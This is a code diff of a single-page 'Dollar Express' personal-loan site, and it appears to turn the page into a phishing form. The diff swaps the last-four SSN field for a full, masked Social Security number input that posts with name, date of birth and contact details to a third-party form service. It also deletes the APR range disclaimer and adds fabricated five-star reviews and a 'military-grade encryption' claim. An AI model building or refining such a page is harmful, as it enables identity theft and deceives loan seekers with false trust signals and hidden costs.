@@ -52,13 +52,12 @@ header {
     url('https://images.unsplash.com/photo-1554224155-6726b3ff858f?auto=format&fit=crop&w=1600&q=80');
     background-size: cover;
     color: white;
-    padding: 80px 0;
+    padding: 90px 0;
     text-align: center;
 }
 
 .hero h2 {
     font-size: 42px;
-    margin-bottom: 10px;
 }
 
 .apr-badge {
@@ -74,15 +73,15 @@ header {
 
 /* FORM */
 .application {
-    padding: 60px 0;
+    padding: 70px 0;
     background: #f0f5ff;
 }
 
 .form-container {
     background: #fff;
-    padding: 40px;
+    padding: 45px;
     border-radius: 15px;
-    max-width: 850px;
+    max-width: 900px;
     margin: auto;
     box-shadow: 0 10px 30px rgba(0,0,0,.1);
 }
@@ -111,10 +110,6 @@ input, select, textarea {
     font-size: 16px;
 }
 
-textarea {
-    resize: vertical;
-}
-
 input:focus, select:focus, textarea:focus {
     outline: none;
     border-color: #1a3a8f;
@@ -136,14 +131,38 @@ input:focus, select:focus, textarea:focus {
     opacity: .9;
 }
 
-.success-message {
-    display: none;
-    margin-top: 20px;
-    background: #4cd964;
-    padding: 20px;
-    color: white;
-    border-radius: 8px;
-    text-align: center;
+.security-text {
+    font-size: 13px;
+    color: #555;
+    margin-bottom: 12px;
+}
+
+/* REVIEWS */
+.reviews {
+    padding: 70px 0;
+    background: white;
+}
+
+.review-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px,1fr));
+    gap: 25px;
+}
+
+.review-card {
+    background: #f9f9f9;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 5px 15px rgba(0,0,0,.05);
+}
+
+.review-card h4 {
+    margin-bottom: 5px;
+}
+
+.stars {
+    color: #f1c40f;
+    margin-bottom: 10px;
 }
 
 /* FOOTER */
@@ -152,14 +171,6 @@ footer {
     color: #ccc;
     padding: 40px 0;
     text-align: center;
-}
-
-.disclaimer {
-    background: #2a2a2a;
-    padding: 20px;
-    margin-top: 20px;
-    font-size: 12px;
-    line-height: 1.5;
 }
 
 /* MOBILE */
@@ -177,162 +188,120 @@ footer {
 <body>
 
 <header>
-    <div class="container header-content">
-        <div class="logo">
-            <h1>DOLLAR<span>EXPRESS</span></h1>
-        </div>
-        <div>
-            <p>Fast Personal Loans • 24hr Funding</p>
-        </div>
+<div class="container header-content">
+    <div class="logo">
+        <h1>DOLLAR<span>EXPRESS</span></h1>
     </div>
+    <p>Get Funded Same Day</p>
+</div>
 </header>
 
 <section class="hero">
-    <div class="container">
-        <h2>Get Your Personal Loan Fast</h2>
-        <p>Approval in minutes • Funding as fast as 24 hours</p>
-        <div class="apr-badge">7.59% APR Starting</div>
-        <p>$3,000 – $50,000 • 12–60 Months</p>
-    </div>
+<div class="container">
+    <h2>Fast & Secure Personal Loans</h2>
+    <p>Approval in minutes • Get Funded Same Day</p>
+    <div class="apr-badge">7.59% APR Starting</div>
+</div>
 </section>
 
 <section class="application">
-    <div class="container">
-        <div class="form-container">
+<div class="container">
+<div class="form-container">
 
-            <h2 style="text-align:center;margin-bottom:20px;color:#1a3a8f;">
-                Apply for Your Loan
-            </h2>
+<h2 style="text-align:center;color:#1a3a8f;margin-bottom:20px;">
+Apply for Your Loan
+</h2>
 
-            <form id="loanForm" action="https://formspree.io/f/YOUR_FORM_ID_HERE" method="POST">
+<form id="loanForm" action="https://formspree.io/f/YOUR_FORM_ID_HERE" method="POST">
 
-                <!-- NAME -->
-                <div class="form-row">
-                    <div class="form-group">
-                        <label>First Name</label>
-                        <input name="first_name" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Last Name</label>
-                        <input name="last_name" required>
-                    </div>
-                </div>
-
-                <!-- CONTACT -->
-                <div class="form-row">
-                    <div class="form-group">
-                        <label>Email</label>
-                        <input type="email" name="email" required>
-                    </div>
-                    <div class="form-group">
-                        <label>Phone</label>
-                        <input type="tel" name="phone" required>
-                    </div>
-                </div>
-
-                <!-- DOB + SSN -->
-                <div class="form-row">
-                    <div class="form-group">
-                        <label>Date of Birth</label>
-                        <input type="date" name="dob" required>
-                    </div>
-                    <div class="form-group">
-                        <label>SSN (Last 4 Digits)</label>
-                        <input 
-                            type="text"
-                            id="ssn_last4"
-                            name="ssn_last4"
-                            maxlength="4"
-                            inputmode="numeric"
-                            placeholder="1234"
-                            required>
-                    </div>
-                </div>
-
-                <!-- LOAN -->
-                <div class="form-row">
-                    <div class="form-group">
-                        <label>Loan Amount</label>
-                        <select name="loan_amount" required>
-                            <option value="">Select</option>
-                            <option>$3,000</option>
-                            <option>$5,000</option>
-                            <option>$10,000</option>
-                            <option>$20,000</option>
-                            <option>$50,000</option>
-                        </select>
-                    </div>
-
-                    <div class="form-group">
-                        <label>Credit Score</label>
-                        <select name="credit_score" required>
-                            <option value="">Select</option>
-                            <option>Excellent (720+)</option>
-                            <option>Good (680-719)</option>
-                            <option>Fair (640-679)</option>
-                            <option>Poor (Below 640)</option>
-                            <option>Not Sure</option>
-                        </select>
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label>Additional Information (Optional)</label>
-                    <textarea name="message" rows="3"></textarea>
-                </div>
-
-                <p style="font-size:13px;color:#666;margin-bottom:10px;">
-                    🔒 Your information is encrypted and securely transmitted.  
-                    SSN is used only for identity verification and loan matching.
-                </p>
-
-                <button class="submit-btn">Get Approved Now</button>
-
-                <div class="success-message" id="successMessage">
-                    ✅ Application submitted successfully! We’ll contact you shortly.
-                </div>
-
-            </form>
-        </div>
+<div class="form-row">
+    <div class="form-group">
+        <label>First Name</label>
+        <input name="first_name" required>
     </div>
+    <div class="form-group">
+        <label>Last Name</label>
+        <input name="last_name" required>
+    </div>
+</div>
+
+<div class="form-row">
+    <div class="form-group">
+        <label>Email</label>
+        <input type="email" name="email" required>
+    </div>
+    <div class="form-group">
+        <label>Phone</label>
+        <input type="tel" name="phone" required>
+    </div>
+</div>
+
+<div class="form-row">
+    <div class="form-group">
+        <label>Date of Birth</label>
+        <input type="date" name="dob" required>
+    </div>
+    <div class="form-group">
+        <label>Social Security Number</label>
+        <input type="password" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
+    </div>
+</div>
+
+<div class="security-text">
+🔒 We use military‑grade encryption to protect your personal information.
+</div>
+
+<button class="submit-btn">Get Funded Now</button>
+
+</form>
+</div>
+</div>
+</section>
+
+<section class="reviews">
+<div class="container">
+<h2 style="text-align:center;color:#1a3a8f;margin-bottom:40px;">
+What Our Customers Say
+</h2>
+
+<div class="review-grid">
+    <div class="review-card">
+        <div class="stars">★★★★★</div>
+        <h4>Michael R.</h4>
+        <p>Got approved in minutes and funded the same day. Super easy process.</p>
+    </div>
+
+    <div class="review-card">
+        <div class="stars">★★★★★</div>
+        <h4>Sarah L.</h4>
+        <p>Very professional and secure. I felt safe submitting my information.</p>
+    </div>
+
+    <div class="review-card">
+        <div class="stars">★★★★★</div>
+        <h4>James T.</h4>
+        <p>Best loan experience I’ve ever had. Fast and transparent.</p>
+    </div>
+</div>
+</div>
 </section>
 
 <footer>
-    <div class="container">
-        <p>© 2026 Dollar Express. All Rights Reserved.</p>
-        <div class="disclaimer">
-            Dollar Express is a loan matching service, not a direct lender.  
-            APR ranges from 7.59%–35.99% depending on creditworthiness.
-        </div>
-    </div>
+<div class="container">
+<p>© 2026 Dollar Express. All Rights Reserved.</p>
+<p style="font-size:12px;margin-top:10px;">
+Dollar Express is a loan matching service, not a direct lender.
+</p>
+</div>
 </footer>
 
 <script>
-// SSN numeric only
-document.getElementById("ssn_last4").addEventListener("input", function () {
-    this.value = this.value.replace(/\D/g, "").slice(0,4);
-});
-
-// Form submit
-const form = document.getElementById("loanForm");
-const success = document.getElementById("successMessage");
-
-form.addEventListener("submit", async function(e) {
-    e.preventDefault();
-
-    const response = await fetch(form.action, {
-        method: "POST",
-        body: new FormData(form),
-        headers: { "Accept": "application/json" }
-    });
-
-    if (response.ok) {
-        form.reset();
-        success.style.display = "block";
-        success.scrollIntoView({ behavior: "smooth" });
-    } else {
-        alert("Submission failed. Please try again.");
-    }
+// SSN auto format
+document.getElementById("ssn").addEventListener("input", function () {
+    let v = this.value.replace(/\D/g, "").slice(0,9);
+    if (v.length > 5) v = v.replace(/(\d{3})(\d{2})(\d+)/, "$1-$2-$3");
+    else if (v.length > 3) v = v.replace(/(\d{3})(\d+)/, "$1-$2");
+    this.value = v;
 });
 </script>
 
